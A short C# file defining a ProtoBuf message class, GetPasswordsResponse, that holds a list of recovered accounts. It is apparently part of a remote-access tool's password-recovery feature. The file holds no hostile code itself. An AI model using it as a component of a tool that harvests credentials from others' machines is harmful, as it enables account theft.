using ProtoBuf;
using Comet.Common.Models;
using System.Collections.Generic;

namespace Comet.Common.Messages
{
    [ProtoContract]
    public class GetPasswordsResponse : IMessage
    {
        [ProtoMember(1)]
        public List<RecoveredAccount> RecoveredAccounts { get; set; }
    }
}
